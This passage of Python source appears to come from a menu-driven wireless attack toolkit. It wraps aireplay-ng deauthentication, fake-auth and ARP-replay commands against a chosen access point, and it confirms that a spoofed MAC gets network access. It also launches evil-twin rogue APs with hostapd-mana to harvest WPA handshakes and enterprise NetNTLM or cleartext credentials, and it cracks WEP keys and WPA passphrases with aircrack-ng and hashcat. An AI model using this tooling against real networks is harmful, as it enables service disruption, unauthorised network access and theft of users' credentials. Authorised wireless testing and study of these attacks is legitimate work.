        if choice == "1":
            restore(); clear()
            print(); print()
            print(rule("connectivity test"))
            print()
            sys.stdout.flush()
            c = _test_connectivity(iface)
            print(f"       {WHT}[1/5]  IP address      {R}"
                  f"{(RDY + c['ip']) if c['ip'] else (ERR + 'none (no DHCP lease)')}{R}")
            if not c["ip"]:
                print()
                print(f"       {ERR}NOT ASSOCIATED{R}")
                print(f"       {WHT}wlan0 got no IP — AP refused a session{R}")
                print(f"       {DIM}verify MAC spoof applied, then repeat DEAUTH step{R}")
                print()
                try:
                    input(" press ENTER to return ")
                except (KeyboardInterrupt, EOFError):
                    pass
                continue
            print(f"       {WHT}[2/5]  default gateway {R}"
                  f"{(RDY + c['gw']) if c['gw'] else (ERR + 'none')}{R}")
            print(f"       {WHT}[3/5]  local ICMP      {R}"
                  f"{(RDY + 'gateway replies') if c['local_icmp'] else (ERR + 'no reply')}{R}")
            print(f"       {WHT}[4/5]  HTTP probe      {R}"
                  f"{(RDY + c['http_code']) if c['http_ok'] else (ERR + c['http_code'])}{R}")
            print(f"       {WHT}[5/5]  internet ICMP   {R}"
                  f"{(RDY + '8.8.8.8 replies') if c['internet_icmp'] else (ERR + 'no reply')}{R}")
            print()
            print(rule("verdict"))
            if c["http_ok"] or c["internet_icmp"] or c["local_icmp"]:
                print(f"       {RDY}ACCESS CONFIRMED{R}  {WHT}spoofed MAC reaches the network{R}")
                if c["http_ok"] and not c["internet_icmp"]:
                    print(f"       {DIM}ICMP-8.8.8.8 blocked, HTTP works (typical guest AP){R}")
            elif c["ip"] and c["gw"]:
                print(f"       {VAL}ASSOCIATED, NO INTERNET{R}")
                print(f"       {DIM}possible captive portal or AP-side isolation{R}")
            else:
                print(f"       {ERR}NOT ASSOCIATED{R}")
            print()
            try:
                input(" press ENTER to return ")
            except (KeyboardInterrupt, EOFError):
                pass
        else:
            restore(); clear()
            print(); print()
            try:
                subprocess.run(["ping", "8.8.8.8"])
            except KeyboardInterrupt:
                pass
            time.sleep(0.3)
            # ping outcome is recorded at confirmation time, not here:
            # Ctrl+C during a transient failure (spoofed MAC before DHCP
            # lease) would capture the wrong state.  Confirmation is where
            # the operator knows the final result.
            continue

def _deauth_draw_menu(info):
    restore(); clear()
    set_pane_title("DEAUTH CONSOLE")
    _console_banner("DEAUTH")
    print()
    print(rule("options"))
    print(f"       {WHT}1  deauth broadcast{R}")

    folder, _ = load_target()
    saved = (info.get("station") or "").strip().upper()
    if saved and ":" in saved:
        tail = f"{saved}  ·  spoofed"
    else:
        stations = []
        if folder:
            try:
                stations = load_stations(folder, info.get("bssid", ""))
            except Exception:
                pass
        tail = stations[-1] if stations else "(waiting for station)"
    print(f"       {WHT}2  deauth target station  ·  {tail}{R}")
    print()
    sys.stdout.flush()
    # option "3" (5-packet broadcast stimulus) is hidden from the menu
    # but its handler in run_deauth_console remains — wep_flow_auto
    # sends "3" programmatically during IV harvest.

def _deauth_draw_stations(folder, bssid):
    restore(); clear()
    set_pane_title("DEAUTH CONSOLE")
    _console_banner("DEAUTH")
    print(); print()
    stations = load_stations(folder, bssid)
    # include the currently-spoofed MAC — for OPEN/WEP flow this IS
    # the target station whose slot we want to free.  load_stations
    # filters own adapter MACs, which now includes our spoofed value,
    # so without this the picker would be empty even when we know the
    # station is right there in the capture.
    _, _info = load_target()
    _spoofed = ((_info or {}).get("station") or "").strip().upper()
    if _spoofed and ":" in _spoofed and _spoofed not in stations:
        stations = [_spoofed] + stations
    if not stations:
        print(f"       {WHT}wait for a station to be present ...{R}")
        print(f"       {DIM}own adapter MACs excluded{R}")
        print()
        sys.stdout.flush()
        input(" press ENTER to return ")
        return None
    print(rule("target stations"))
    for i, mac in enumerate(stations, 1):
        print(f"       {WHT}{i}  {mac}{R}")
    print()
    print(f"       {DIM}own adapter MACs excluded{R}")
    print(f"       {WHT}0  back{R}")
    print()
    sys.stdout.flush()
    try:
        choice = input(f"   {LBL}SELECT OPTION ▸{R} ").strip()
    except (KeyboardInterrupt, EOFError):
        return None
    if not choice.isdigit():
        return None
    n = int(choice)
    if n == 0:
        return None
    if 1 <= n <= len(stations):
        return stations[n - 1]
    return None

def _deauth_broadcast(bssid, count=10):
    restore(); clear()
    iface = MONITOR()
    print(); print()
    print(rule("deauth broadcast"))
    print(row("target", bssid, WHT))
    print(row("count",  str(count), WHT))
    print()
    try:
        subprocess.run(["sudo", "aireplay-ng", "-0", str(count),
                        "-a", bssid, iface])
    except KeyboardInterrupt:
        pass
    time.sleep(0.3)

def _deauth_target(bssid, mac):
    restore(); clear()
    iface = MONITOR()
    print(); print()
    print(rule("deauth target"))
    print(row("target",  bssid, WHT))
    print(row("station", mac,   WHT))
    print()
    try:
        subprocess.run(["sudo", "aireplay-ng", "-0", "10",
                        "-a", bssid, "-c", mac, iface])
    except KeyboardInterrupt:
        pass
    time.sleep(0.3)

def run_deauth_console():
    set_pane_title("DEAUTH CONSOLE")
    role_signals(ignore_sigint=True)

    while True:
        folder, info = load_target()
        if not folder:
            clear()
            print()
            print(f"  {ERR}ERROR:{R} no target selected")
            print()
            input(" press ENTER ")
            continue

        bssid = info.get("bssid", "")
        _deauth_draw_menu(info)

        try:
            choice = input(f"   {LBL}SELECT OPTION ▸{R} ").strip()
        except (KeyboardInterrupt, EOFError):
            continue

        if choice == "1":
            _deauth_broadcast(bssid)
            continue
        if choice == "2":
            saved = (info.get("station") or "").strip().upper()
            if saved and ":" in saved:
                _deauth_target(bssid, saved)
            else:
                mac = _deauth_draw_stations(folder, bssid)
                if mac:
                    _deauth_target(bssid, mac)
            continue
        if choice == "3":
            _deauth_broadcast(bssid, count=5)
            continue

def _fakeauth_draw_menu(info):
    restore(); clear()
    set_pane_title("FAKE AUTH CONSOLE")
    _console_banner("FAKEAUTH")
    print()
    print(rule("options"))
    print(f"       {WHT}1  start fake auth  ·  enter to return after result{R}")
    print()
    sys.stdout.flush()

def _fakeauth_do(folder, info):
    iface = MONITOR()
    bssid = info.get("bssid", "")

    mac = current_mac(iface)
    if not mac:
        restore(); clear()
        print(); print()
        print(f"  {ERR}ERROR:{R} adapter mac not available")
        print()
        input(" press ENTER to return ")
        return

    restore(); clear()
    print(); print()
    try:
        subprocess.run(["sudo", "aireplay-ng", "--fakeauth", "0",
                        "-a", bssid, "-h", mac, iface])
    except KeyboardInterrupt:
        pass
    print()
    try:
        input(" press ENTER to return ")
    except (KeyboardInterrupt, EOFError):
        pass

def run_fakeauth_console():
    set_pane_title("FAKE AUTH CONSOLE")
    role_signals(ignore_sigint=True)

    while True:
        folder, info = load_target()
        if not folder:
            clear()
            print()
            print(f"  {ERR}ERROR:{R} no target selected")
            print()
            input(" press ENTER ")
            continue

        _fakeauth_draw_menu(info)
        try:
            choice = input(f"   {LBL}SELECT OPTION ▸{R} ").strip()
        except (KeyboardInterrupt, EOFError):
            continue

        if choice == "1":
            _fakeauth_do(folder, info)
            continue

def _arpreplay_draw_menu(info):
    restore(); clear()
    set_pane_title("ARP REPLAY CONSOLE")
    _console_banner("ARPREPLAY")
    print()
    print(rule("options"))
    print(f"       {WHT}1  arp replay  ·  adapter mac{R}")

    folder, _ = load_target()
    stations = []
    if folder:
        try:
            stations = load_stations(folder, info.get("bssid", ""))
        except Exception:
            pass
    tail = stations[-1] if stations else "(waiting for station)"
    print(f"       {WHT}2  arp replay  ·  station mac  ·  {tail}{R}")
    print()
    print(f"       {DIM}ctrl+c while replaying stops and returns to this menu{R}")
    print()
    sys.stdout.flush()

def _arpreplay_draw_stations(folder, bssid):
    restore(); clear()
    _console_banner("ARPREPLAY")
    print(); print()
    stations = load_stations(folder, bssid)
    if not stations:
        print(f"       {WHT}wait for a station in capture panel ...{R}")
        print()
        sys.stdout.flush()
        input(" press ENTER to return ")
        return None
    print(rule("stations"))
    for i, mac in enumerate(stations, 1):
        print(f"       {WHT}{i}  {mac}{R}")
    print()
    sys.stdout.flush()
    try:
        choice = input(f"   {LBL}SELECT OPTION ▸{R} ").strip()
    except (KeyboardInterrupt, EOFError):
        return None
    if not choice.isdigit():
        return None
    n = int(choice)
    if 1 <= n <= len(stations):
        return stations[n - 1]
    return None

def _arpreplay_do(bssid, mac, folder=None):
    """Run aireplay-ng --arpreplay.

    Ctrl+C strategy: spawn the child in its own session
    (start_new_session=True).  The terminal delivers SIGINT only to the
    foreground process group — which no longer contains aireplay-ng — so
    aireplay-ng never even sees Ctrl+C.  Python alone receives SIGINT,
    overrides the SIG_IGN installed by role_signals(ignore_sigint=True)
    with default_int_handler, raises KeyboardInterrupt from proc.wait(),
    and then killpg's the entire child session (sudo + aireplay-ng).

    This is the only reliable way to stop aireplay-ng --arpreplay, which
    traps SIGINT and keeps transmitting.  Matches CAPTURE console
    flexibility: Ctrl+C always returns to the menu so the operator can
    try the other ARP vector.
    """
    restore(); clear()
    iface = MONITOR()
    print(); print()
    if folder:
        print(row("output", os.path.basename(folder) + "/"))
        print()

    old_cwd = os.getcwd()
    moved   = False
    if folder and os.path.isdir(folder):
        try:
            os.chdir(folder)
            moved = True
        except Exception:
            moved = False

    try:
        proc = subprocess.Popen(
            ["sudo", "aireplay-ng", "--arpreplay",
             "-b", bssid, "-h", mac, iface],
            start_new_session=True)
    except Exception as e:
        print(f"  {ERR}ERROR:{R} cannot start aireplay-ng: {e}")
        if moved:
            try: os.chdir(old_cwd)
            except Exception: pass
        input(" press ENTER to return ")
        return

    old_sigint = signal.signal(signal.SIGINT, signal.default_int_handler)
    try:
        try:
            proc.wait()
        except KeyboardInterrupt:
            try:
                os.killpg(proc.pid, signal.SIGTERM)
            except Exception:
                pass
            try:
                proc.wait(timeout=4)
            except Exception:
                try:
                    os.killpg(proc.pid, signal.SIGKILL)
                except Exception:
                    pass
                try: proc.wait(timeout=2)
                except Exception: pass
    except KeyboardInterrupt:
        pass
    finally:
        signal.signal(signal.SIGINT, old_sigint)
        if proc.poll() is None:
            try: os.killpg(proc.pid, signal.SIGKILL)
            except Exception: pass
            try: proc.kill()
            except Exception: pass
        if moved:
            try: os.chdir(old_cwd)
            except Exception: pass
    time.sleep(0.5)

def run_arpreplay_console():
    set_pane_title("ARP REPLAY CONSOLE")
    role_signals(ignore_sigint=True)

    while True:
        folder, info = load_target()
        if not folder:
            clear()
            print()
            print(f"  {ERR}ERROR:{R} no target selected")
            print()
            input(" press ENTER ")
            continue

        bssid = info.get("bssid", "")
        _arpreplay_draw_menu(info)

        try:
            choice = input(f"   {LBL}SELECT OPTION ▸{R} ").strip()
        except (KeyboardInterrupt, EOFError):
            continue

        if choice == "1":
            iface = MONITOR()
            mac = current_mac(iface)
            if not mac:
                restore(); clear()
                print(); print()
                print(f"  {ERR}ERROR:{R} adapter mac not available")
                print()
                input(" press ENTER to return ")
                continue
            _arpreplay_do(bssid, mac, folder=folder)
            continue

        if choice == "2":
            mac = _arpreplay_draw_stations(folder, bssid)
            if mac:
                _arpreplay_do(bssid, mac, folder=folder)
            continue

CONF_PATH = "/tmp/wsa_evil_twin.conf"

def _evil_twin_read_target():
    folder, info = load_target()
    if not folder:
        return None, None, None, None, None
    essid = info.get("essid", "?")
    bssid = info.get("bssid", "")
    ch    = info.get("channel", "6")
    try:
        ch_int = int(ch)
        ch = str(ch_int) if ch_int <= 14 else "6"
    except Exception:
        ch = "6"
    return folder, info, essid, bssid, ch

def _evil_twin_draw_menu(iface, essid, bssid, conf):
    restore(); clear()
    _console_banner("EVIL_TWIN")
    print(); print()
    print(rule("adapter"))
    print(f"       {WHT}{iface:<12}"
          f"{current_mac(iface) or '(not found)':<20}|  "
          f"{evil_adapter_mode(iface)}{R}")
    print()
    print(rule("target"))
    print(f"       {WHT}{'essid':<12}{essid:<20}|  ch {evil_read_conf_channel(conf)}{R}")
    print(f"       {WHT}{'bssid':<12}{bssid:<20}{R}")
    print()
    print(rule("options"))
    print(f"       {WHT}1  edit config{R}")
    print(f"       {WHT}2  activate rogue AP{R}")
    print()
    sys.stdout.flush()

def _evil_twin_do_edit(conf, ap_type="personal"):
    evil_kill_hostapd()

    _exists = os.path.exists(conf)
    _size   = os.path.getsize(conf) if _exists else -1
    dbg(f"do_edit: pre conf={conf!r} exists={_exists} size={_size}")

    # self-heal if missing or empty
    if not _exists or _size == 0:
        dbg(f"do_edit: file missing/empty, re-writing from current target")
        try:
            _folder, _info, _essid, _bssid, _ch = _evil_twin_read_target()
            if _folder:
                if ap_type == "personal":
                    evil_write_conf_personal(AP(), _essid, _bssid, _ch, conf)
                else:
                    evil_write_conf_enterprise(AP(), _essid, _bssid, _ch, _folder, conf)
        except Exception as _e:
            dbg(f"do_edit: re-write error={_e!r}")

    try:
        _run_sudo("chown", f"{os.getuid()}:{os.getgid()}", conf)
        os.chmod(conf, 0o644)
    except Exception:
        pass

    # save backup in case nano empties the file
    _backup_content = None
    try:
        with open(conf) as f:
            _backup_content = f.read()
        dbg(f"do_edit: backup_len={len(_backup_content)}")
    except Exception as _e:
        dbg(f"do_edit: backup error={_e!r}")

    # PREVIEW content first — proves the file is good on disk
    restore(); clear()
    print(f"\n   Conf: {conf}")
    try:
        _sz = os.path.getsize(conf) if os.path.exists(conf) else 0
    except Exception:
        _sz = -1
    print(f"   Size: {_sz} bytes")
    print()
    print(f"   {DIM}─── content preview ───{R}")
    try:
        with open(conf) as f:
            for _line in f:
                print(f"   {WHT}{_line.rstrip()}{R}")
    except Exception as e:
        print(f"   {ERR}cannot read: {e}{R}")
    print(f"   {DIM}─── end preview ───{R}")
    print()
    try:
        input(f"   {LBL}press ENTER to open in nano (Ctrl+C to skip):{R} ")
    except (KeyboardInterrupt, EOFError):
        return

    # check nano exists and version
    try:
        _nv = subprocess.run(["nano", "--version"],
                             capture_output=True, text=True, timeout=3)
        dbg(f"do_edit: nano version={_nv.stdout.strip().splitlines()[0] if _nv.stdout else 'unknown'}")
    except Exception as _e:
        dbg(f"do_edit: nano --version failed={_e!r}")

    # now open nano with --ignorercfiles (bypass any user nanorc)
    restore()
    dbg(f"do_edit: launching nano --ignorercfiles {conf!r}")
    try:
        subprocess.run(["nano", "--ignorercfiles", conf])
        dbg(f"do_edit: nano returned cleanly")
    except FileNotFoundError:
        dbg(f"do_edit: nano not found, trying vi")
        try:
            subprocess.run(["vi", conf])
        except Exception as _e:
            dbg(f"do_edit: vi failed={_e!r}")
    except Exception as _e:
        dbg(f"do_edit: nano failed={_e!r}")
    restore()

    # post-edit verification
    try:
        _post_sz = os.path.getsize(conf) if os.path.exists(conf) else 0
        dbg(f"do_edit: post nano size={_post_sz}")
    except Exception:
        _post_sz = -1

    # if nano emptied the file, restore backup and warn
    if _post_sz == 0 and _backup_content:
        dbg(f"do_edit: nano produced empty file, restoring backup")
        try:
            with open(conf, "w") as f:
                f.write(_backup_content)
            print(f"\n   {VAL}warning:{R} nano returned empty file — restored previous content")
            print(f"   {DIM}try vi manually: vi {conf}{R}")
            time.sleep(2.5)
        except Exception as _e:
            dbg(f"do_edit: backup restore failed={_e!r}")





def _evil_twin_console(ap_type):
    title = ("WPA-PERSONAL EVIL TWIN CONSOLE" if ap_type == "personal"
             else "WPA-ENTERPRISE EVIL TWIN CONSOLE")
    set_pane_title(title)
    role_signals(ignore_sigint=True)

    iface = AP()

    while True:
        folder, info, essid, bssid, ch = _evil_twin_read_target()
        if not folder:
            clear()
            print()
            print(f"  {ERR}ERROR:{R} no target selected")
            print()
            input(" press ENTER ")
            continue

        log_path = f"{folder}/mana_hashes.txt"

        if ap_type == "personal":
            evil_write_conf_personal(iface, essid, bssid, ch, CONF_PATH)
            extract_fn = extract_mana_personal
        else:
            evil_write_conf_enterprise(iface, essid, bssid, ch, folder,
                                       CONF_PATH)
            extract_fn = extract_mana_enterprise

        while True:
            _evil_twin_draw_menu(iface, essid, bssid, CONF_PATH)
            try:
                choice = input(f"   {LBL}SELECT OPTION ▸{R} ").strip()
            except (KeyboardInterrupt, EOFError):
                break

            if choice == "1":
                _evil_twin_do_edit(CONF_PATH, ap_type=ap_type)
                continue

            if choice == "2":
                evil_run_hostapd(iface, CONF_PATH, log_path, title, extract_fn)
                continue

            continue

def run_evil_twin_personal_console():
    _evil_twin_console("personal")

def run_evil_twin_enterprise_console():
    _evil_twin_console("enterprise")

# ═══════════════════════════════════════════════════════════════════════════
# SECTION 8 · ANALYSIS BACKENDS + CONSOLE
# ═══════════════════════════════════════════════════════════════════════════

def _filter_rogue_handshakes(hashfile, exclude_psk="downgrade123"):
    """Run a single-candidate probe with exclude_psk against hashfile.
    Return the set of MICs that crack — those are rogue-side handshakes
    (client tried OUR fake AP with OUR fake PSK, not real AP with real
    PSK). Exclude them from subsequent attacks against the real password.

    Cost: ~1s on CPU for a small capture (1 candidate × N hashes).
    Saves: potential 45-minute mask run against material that can never
    decode the real PSK.
    """
    import tempfile
    psk_file = tempfile.mktemp(suffix=".psk")
    out_file = tempfile.mktemp(suffix=".rec")
    try:
        with open(psk_file, "w") as f:
            f.write(exclude_psk + "\n")
        subprocess.run(
            ["hashcat", "-m", "22000", hashfile, psk_file,
             "--potfile-disable", "-D", "1", "-w", "3",
             "-o", out_file, "--quiet"],
            capture_output=True, text=True, timeout=30)
        if not os.path.exists(out_file):
            return set()
        cracked = set()
        with open(out_file, errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line or ":" not in line:
                    continue
                # recovered line: MIC:AP:STA:SSID:password  (compact)
                # or WPA*02*MIC*AP*STA*...*PSK (full)
                if line.startswith("WPA*"):
                    parts = line.split("*")
                    if len(parts) >= 3:
                        cracked.add(parts[2].strip().lower())
                else:
                    mic = line.split(":")[0].strip().lower()
                    if mic:
                        cracked.add(mic)
        return cracked
    except Exception:
        return set()
    finally:
        for p in (psk_file, out_file):
            try: os.unlink(p)
            except Exception: pass


def extract_mana_personal():
    folder, _ = load_target()
    if not folder:
        return
    raw_hc = f"{folder}/mana_hashes.txt"
    if not os.path.exists(raw_hc):
        return

    # parse WPA*01* (PMKID) and WPA*02* (EAPOL) lines from raw hostapd-mana log
    wpa_lines = []
    for line in open(raw_hc, errors="ignore"):
        line = line.strip()
        if not line:
            continue
        idx = line.find("WPA*")
        if idx == -1:
            continue
        wpa = line[idx:].strip()
        if wpa.startswith("WPA*02*") or wpa.startswith("WPA*01*"):
            wpa_lines.append(wpa)

    if not wpa_lines:
        return

    # raw archive — untouched, for evidence
    with open(f"{folder}/mana_hashes_all.hc22000", "w") as f:
        f.write("\n".join(wpa_lines) + "\n")

    # dedupe by MIC
    unique = {}
    for line in wpa_lines:
        parts = line.split("*")
        if len(parts) < 5:
            continue
        mic = parts[2].strip().lower()
        if mic not in unique:
            unique[mic] = line
    deduped = list(unique.values())

    # write probe file, run downgrade123 filter
    probe_path = f"{folder}/mana_hashes.hc22000"
    with open(probe_path, "w") as f:
        f.write("\n".join(deduped) + "\n")

    rogue_mics = _filter_rogue_handshakes(probe_path)

    # keep only real-side (those that do NOT crack with downgrade123)
    filtered = [line for line in deduped
                if line.split("*")[2].strip().lower() not in rogue_mics]

    with open(probe_path, "w") as f:
        f.write("\n".join(filtered) + "\n")

    # log classification
    with open(f"{folder}/filter_log.txt", "w") as f:
        f.write(f"raw extracted:     {len(wpa_lines)}\n")
        f.write(f"after dedupe:      {len(deduped)}\n")
        f.write(f"rogue-side:        {len(rogue_mics)}  (crack with downgrade123 — removed)\n")
        f.write(f"real-side kept:    {len(filtered)}  (crack with target PSK)\n")



def extract_mana_enterprise():
    folder, _ = load_target()
    if not folder:
        return
    creds = f"{folder}/credentials.txt"
    if not os.path.exists(creds):
        return

    jtr, hcat = [], []
    cleartext_count = 0
    skipped = 0
    for line in open(creds, errors="ignore"):
        line = line.strip()
        if not line or not line.startswith("["):
            continue
        close = line.find("]")
        if close < 0:
            continue
        tag = line[1:close].strip().upper()
        payload = line[close + 1:].strip()
        if not payload:
            continue
        # TTLS-PAP cleartext — already usable, no cracking needed
        if "PAP" in tag or "CLEAR" in tag:
            cleartext_count += 1
            continue
        # guard: skip raw WPA* lines (PMKID/4-way — not enterprise creds)
        if payload.startswith("WPA*"):
            skipped += 1
            continue
        if "JTR" in tag:
            jtr.append(payload)
        elif "HASHCAT" in tag:
            hcat.append(payload)
        elif "NETNTLM" in tag:
            # raw hostapd-mana tag on some versions — detect format
            if payload.startswith("$NETNTLM$"):
                jtr.append(payload)
            elif ":" in payload and "WPA*" not in payload:
                hcat.append(payload)

    jtr  = list(dict.fromkeys(jtr))
    hcat = list(dict.fromkeys(hcat))

    if jtr:
        with open(f"{folder}/hashes_jtr.txt", "w") as f:
            f.write("\n".join(jtr) + "\n")
    if hcat:
        with open(f"{folder}/hashes_hc5500.txt", "w") as f:
            f.write("\n".join(hcat) + "\n")

    with open(f"{folder}/filter_log.txt", "w") as f:
        f.write(f"jtr hashes:        {len(jtr)}\n")
        f.write(f"hashcat hashes:    {len(hcat)}\n")
        f.write(f"cleartext (PAP):   {cleartext_count}\n")
        f.write(f"skipped non-creds: {skipped}  (WPA* PMKID/4-way)\n")



def _hashcat_safe_flags(mode):
    """Return hashcat device flags safe for this mode on this host.

    Known issue: Intel Iris Xe / UHD / HD Graphics with -m 22000 / 5500
    under --force silently drops candidates — progress advances but the
    hash is never tested.  When only such an integrated GPU is present,
    force CPU-only (-D 1) so every candidate is actually tested.  Slower
    per candidate but correct.

    Discrete GPUs (NVIDIA / AMD Radeon) are trusted — no override.
    """
    try:
        r = subprocess.run(["hashcat", "-I"],
                           capture_output=True, text=True, timeout=15)
        out = r.stdout
        intel_igpu = any(x in out for x in
                         ("Intel(R) Iris", "Intel(R) UHD",
                          "Intel(R) HD Graphics"))
        discrete   = any(x in out for x in
                         ("NVIDIA", "Radeon", "AMD GPU"))
        if intel_igpu and not discrete:
            # dual devices, no --force, no -O — hashcat's safety check
            # decides whether Iris Xe is usable for this mode.  If it
            # refuses at start, fall back to CPU-only by re-running
            # manually with -D 1; the patch cannot auto-detect refusal.
            return ["-D", "1,2"]
    except Exception:
        pass
    return []

def _recovery_strategy():
    wl   = CFG.get("default_wordlist") or ""
    mask = CFG.get("default_mask") or ""

    if mask:
        return ("MASK", mask)

    if wl:
        d = CFG.get("wordlists_dir") or DEFAULTS["wordlists_dir"]
        if not os.path.isabs(d):
            d = os.path.join(BASE, d)
        path = wl if os.path.isabs(wl) else os.path.join(d, wl)
        if os.path.exists(path):
            return ("WORDLIST", path)

    return None

def _recovery_prompt_strategy(method=None):
    """Recovery was selected — show wordlist/mask menu.
    Returns (kind, source) or None if user cancels.
    `method` is the tool chosen in the analysis menu (e.g. "hashcat -m 5500"
    or "john netntlm"); it is displayed in the wordlist screen so the
    operator sees the choice they made.  The old in-menu enterprise
    method toggle has been removed — tool choice happens one level up."""
    while True:
        result = menu_wordlist(show_run=True, method=method)
        if result == "back":
            return None
        if result == "run":
            s = _recovery_strategy()
            if s:
                return s
            restore(); clear()
            standard_header()
            print()
            print(rule("recovery"))
            print(f"       {WHT}no strategy configured{R}")
            print(f"       {DIM}set a wordlist or mask first{R}")
            print()
            input(f"   {LBL}press ENTER to return to menu \u25b8{R} ")
            continue



def run_wep_aircrack():
    """Recover a WEP key from the largest capture in the target folder.

    Streams aircrack-ng output live (like the hashcat / john paths) so
    the operator sees PTW/FMS progression instead of a blank screen that
    looks hung.  Ctrl+C stops cleanly.  On completion or abort the IV
    count is written to target_info.txt so the analysis card can show it
    when the key is not recovered."""
    folder, info = load_target()
    if not folder:
        return False
    bssid   = (info.get("bssid") or "").strip()
    channel = (info.get("channel") or "").strip()

    caps = sorted(glob.glob(f"{folder}/capture-*.cap"))
    if not caps:
        caps = sorted(glob.glob(f"{folder}/*.cap"))
    if not caps:
        restore(); clear()
        print(); print()
        print(f"       {ERR}no .cap file in {folder}{R}")
        print(f"       {DIM}re-run capture to produce a capture-*.cap{R}")
        print()
        try: input(" press ENTER to return ")
        except (KeyboardInterrupt, EOFError): pass
        return False
    cap = max(caps, key=lambda f: os.path.getsize(f))

    restore(); clear()
    print(); print()
    print(rule("wep key recovery"))
    print()
    print(row("capture", os.path.basename(cap)))
    print(row("size",    f"{os.path.getsize(cap):,} bytes"))
    print(row("bssid",   bssid or "(auto-pick)"))
    print(row("channel", channel or "-"))
    print(row("tool",    "aircrack-ng -a 1"))
    print()
    print(f"       {DIM}streaming aircrack-ng output - ctrl+c stops{R}")
    print()
    sys.stdout.flush()

    cmd = ["sudo", "aircrack-ng", "-a", "1"]
    if bssid:
        cmd += ["-b", bssid]
    cmd.append(cap)

    proc_holder = {"proc": None}
    old_handler = [None]
    def _sigint(s, f):
        p = proc_holder.get("proc")
        if p is None:
            signal.signal(signal.SIGINT, old_handler[0])
            raise KeyboardInterrupt
        if p.poll() is None:
            try: p.send_signal(signal.SIGINT)
            except Exception: pass

    KEY_RE = re.compile(r'KEY FOUND!\s*\[\s*([0-9A-Fa-f:]+)\s*\]')
    IV_RE  = re.compile(r'(?:got|Got|with)\s+(\d+)\s+IVs', re.IGNORECASE)
    key = None
    iv_count = 0
    old_handler[0] = signal.signal(signal.SIGINT, _sigint)
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True, bufsize=1,
            start_new_session=True)
        proc_holder["proc"] = proc
        for line in proc.stdout:
            sys.stdout.write(line)
            sys.stdout.flush()
            # terminal success - kill so the loop exits immediately and
            # the card renders without any operator key
            m = KEY_RE.search(line)
            if m:
                key = m.group(1)
                try: os.killpg(proc.pid, signal.SIGTERM)
                except Exception: pass
                break
            # terminal failure - aircrack-ng falls into its own prompt
            # waiting for stdin ("q"), blocking the pipe forever.  Kill
            # now so the failure card renders on its own.
            if "Failed. Next try with" in line:
                try: os.killpg(proc.pid, signal.SIGTERM)
                except Exception: pass
                break
            m2 = IV_RE.search(line)
            if m2:
                try: iv_count = int(m2.group(1))
                except Exception: pass
        try:
            proc.wait(timeout=4)
        except subprocess.TimeoutExpired:
            try: os.killpg(proc.pid, signal.SIGKILL)
            except Exception: pass
            try: proc.wait(timeout=2)
            except Exception: pass
    except KeyboardInterrupt:
        pass
    finally:
        signal.signal(signal.SIGINT, old_handler[0])
        p = proc_holder["proc"]
        if p is not None and p.poll() is None:
            try: os.killpg(p.pid, signal.SIGTERM)
            except Exception: pass
            try: p.wait(timeout=3)
            except Exception:
                try: os.killpg(p.pid, signal.SIGKILL)
                except Exception: pass

    print()
    sys.stdout.flush()
    tf = os.path.join(folder, "target_info.txt")
    if key:
        key_hex = key.replace(":", "").upper()
        ascii_key = ""
        if len(key_hex) in (10, 26):
            try:
                ascii_key = bytes.fromhex(key_hex).decode("ascii")
            except Exception:
                pass
        with open(os.path.join(folder, "key.txt"), "w") as f:
            f.write(f"HEX:   {key_hex}\n")
            f.write(f"ASCII: {ascii_key or '(not printable)'}\n")
            if iv_count:
                f.write(f"IVS:   {iv_count}\n")
        try:
            if os.path.exists(tf):
                _ls = [l for l in open(tf, errors="ignore").read().splitlines()
                       if not l.upper().startswith(("WEP_IVS:", "WEP_RESULT:"))]
                _ls.append(f"WEP_IVS:           {iv_count}")
                _ls.append("WEP_RESULT:        yes")
                open(tf, "w").write("\n".join(_ls) + "\n")
        except Exception:
            pass
        print(f"  {RDY}DONE{R}  {WHT}WEP key recovered{R}")
        print(row("hex",   key_hex))
        if ascii_key:
            print(row("ascii", ascii_key))
        if iv_count:
            print(row("ivs",   f"{iv_count:,}"))
    else:
        try:
            if os.path.exists(tf):
                _ls = [l for l in open(tf, errors="ignore").read().splitlines()
                       if not l.upper().startswith(("WEP_IVS:", "WEP_RESULT:"))]
                _ls.append(f"WEP_IVS:           {iv_count}")
                _ls.append("WEP_RESULT:        no")
                open(tf, "w").write("\n".join(_ls) + "\n")
        except Exception:
            pass
        print(f"  {VAL}WARN{R}  {WHT}no key recovered{R}")
        print(row("ivs", str(iv_count) if iv_count else "unknown"))
        print()
        print(f"       {DIM}WEP needs >= 50,000 IVs for reliable PTW recovery{R}")
        if iv_count and iv_count < 50000:
            print(f"       {DIM}current: {iv_count:,} - capture again for longer{R}")
        print(f"       {DIM}verify capture-*.cap holds more than replay_arp-*.cap{R}")
    print()
    sys.stdout.flush()
    time.sleep(1.0)
    return None

def run_wpa_personal_hashcat():
    folder, _ = load_target()
    if not folder:
        return

    hashes = sorted(glob.glob(f"{folder}/*.hc22000"))
    preferred = [h for h in hashes if h.endswith("/mana_hashes.hc22000")]
    if preferred:
        hashes = preferred
    if not hashes:
        return
    hashfile  = hashes[0]
    recovered = f"{hashfile}.recovered"
    try: os.remove(recovered)
    except Exception: pass

    strategy = _recovery_prompt_strategy(method="hashcat -m 22000")
    if not strategy:
        return False   # user cancelled from strategy menu

    restore(); clear()
    print("=" * 60)
    print(" WPA PERSONAL - PASSPHRASE RECOVERY")
    print("=" * 60)
    print()
    print(f" Hash : {hashfile}")
    print()

    kind, source = strategy
    safe_flags = _hashcat_safe_flags(22000)
    if safe_flags:
        print(f" {DIM}device: CPU only — Intel iGPU detected, avoiding silent skip{R}")
    if kind == "WORDLIST":
        cmd = ["hashcat", "-m", "22000", hashfile, source,
               "-w", "4", "-o", recovered, "--potfile-disable"] + safe_flags
        print(f" {LBL}WORDLIST : {WHT}{source}{R}")
    else:
        cmd = ["hashcat", "-m", "22000", hashfile, "-a", "3", source,
               "-w", "4", "-o", recovered, "--potfile-disable"] + safe_flags
        print(f" {LBL}MASK     : {WHT}{source}{R}")
    print()
    print(f" {DIM}fresh run · potfile disabled · stops at first crack{R}")
    print()
    print(" Running hashcat -m 22000 ...")
    print()
    sys.stdout.flush()

    proc_holder = {"proc": None}
    old_handler = [None]
    def _sigint(s, f):
        p = proc_holder.get("proc")
        if p is None:
            signal.signal(signal.SIGINT, old_handler[0])
            raise KeyboardInterrupt
        if p.poll() is None:
            try: p.send_signal(signal.SIGINT)
            except Exception: pass

